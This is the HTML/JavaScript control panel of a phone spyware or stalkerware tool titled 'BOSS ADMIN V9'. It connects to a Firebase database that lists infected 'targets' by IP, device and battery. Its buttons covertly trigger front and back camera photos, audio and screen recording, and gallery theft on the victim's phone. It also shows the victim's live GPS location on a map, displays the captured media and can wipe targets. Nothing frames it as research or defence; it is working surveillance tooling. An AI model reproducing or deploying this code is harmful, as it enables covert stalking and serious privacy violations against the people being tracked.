<!DOCTYPE html>
<html>
<head>
    <title>BOSS ADMIN V9</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #111; }
        body { background: var(--bg); color: var(--neon); font-family: monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        .sidebar { width: 300px; border-right: 1px solid #222; padding: 15px; overflow-y: auto; }
        .card { border: 1px solid #222; padding: 10px; margin-bottom: 10px; cursor: pointer; position: relative; }
        .card.active { border-color: var(--neon); background: rgba(0,255,65,0.1); }
        .main { flex: 1; padding: 20px; overflow-y: auto; }
        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; cursor: pointer; margin: 5px; font-size: 11px; font-weight: bold; }
        .btn:hover { background: var(--neon); color: #000; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .box { background: var(--panel); border: 1px solid #222; padding: 15px; border-radius: 5px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
        img, video { width: 100%; border: 1px solid #333; margin-top: 5px; }
        #map-box { height: 200px; width: 100%; border: 1px solid #333; background: #000; }
    </style>
</head>
<body>

<div class="sidebar">
    <h2 style="border-bottom: 2px solid var(--neon);">COMMANDER_V9</h2>
    <div id="target-list">Connecting...</div>
</div>

<div class="main">
    <div id="controls" style="display:none;">
        <h2 id="target-title">Target: ---</h2>
        <div class="control-grid">
            <button class="btn" onclick="cmd('photo')">FRONT PHOTO</button>
            <button class="btn" onclick="cmd('back_photo')">BACK CAMERA</button>
            <button class="btn" onclick="cmd('audio')">RECORD AUDIO</button>
            <button class="btn" onclick="cmd('gallery')">OPEN GALLERY</button>
            <button class="btn" onclick="cmd('screen')">SCREEN RECORD</button>
            <button class="btn" style="border-color:red; color:red;" onclick="delTarget()">WIPE USER</button>
        </div>

        <div class="grid" style="margin-top:20px;">
            <div class="box">
                <h3>LIVE MAP TRACKER</h3>
                <div id="map-box">No Signal</div>
                <button class="btn" style="width:100%" onclick="fullMap()">OPEN IN GOOGLE MAPS</button>
            </div>
            <div class="box">
                <h3>SPECIFICATIONS</h3>
                <div id="info-box">...</div>
            </div>
            <div class="box" style="grid-column: span 2;">
                <h3>VISUAL & AUDIO FEED</h3>
                <div id="media-box" class="gallery"></div>
            </div>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selectedID = null;
    let loc = null;

    db.ref('targets').on('value', snap => {
        const list = document.getElementById('target-list');
        list.innerHTML = "";
        snap.forEach(t => {
            const id = t.key; const d = t.val();
            list.innerHTML += `<div class="card ${selectedID==id?'active':''}" onclick="select('${id}')">
                <strong>${id}</strong><br><small>${d.info ? d.info.ip : '---'}</small>
                ${d.info && d.info.status=="ONLINE" ? '<span style="float:right;color:var(--neon)">‚óè</span>' : ''}
            </div>`;
        });
    });

    function select(id) {
        selectedID = id;
        document.getElementById('controls').style.display = 'block';
        document.getElementById('target-title').innerText = "TARGET: " + id;
        
        db.ref(`targets/${id}/info`).on('value', s => {
            const d = s.val() || {};
            document.getElementById('info-box').innerHTML = `IP: ${d.ip}<br>BATT: ${d.battery}<br>DEVICE: ${d.device}<br>TIME: ${d.time}`;
        });

        db.ref(`targets/${id}/location`).on('value', s => {
            loc = s.val();
            if(loc && loc.lat) {
                const mapUrl = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
                document.getElementById('map-box').innerHTML = `<iframe width="100%" height="100%" src="${mapUrl}" frameborder="0"></iframe>`;
            }
        });

        db.ref(`targets/${id}`).on('value', s => {
            const box = document.getElementById('media-box'); box.innerHTML = "";
            const data = s.val() || {};
            if(data.photos) Object.entries(data.photos).reverse().forEach(([k,p]) => {
                box.innerHTML += `<div><small>${p.type}</small><img src="${p.img}" onclick="window.open(this.src)"></div>`;
            });
            if(data.gallery) Object.values(data.gallery).forEach(g => {
                box.innerHTML += `<img src="${g.data}" onclick="window.open(this.src)">`;
            });
            if(data.audios) Object.values(data.audios).forEach(a => {
                box.innerHTML += `<audio src="${a.audio}" controls style="width:100%"></audio>`;
            });
            if(data.screens) Object.values(data.screens).forEach(sc => {
                box.innerHTML += `<video src="${sc.video}" controls></video>`;
            });
        });
    }

    function cmd(a) { db.ref(`commands/${selectedID}`).set({ action: a, t: Date.now() }); }
    function fullMap() { if(loc) window.open(`https://www.google.com/maps?q=${loc.lat},${loc.lng}`); }
    function delTarget() { if(confirm("Wipe Target?")) db.ref(`targets/${selectedID}`).remove(); }
</script>
</body>
</html>
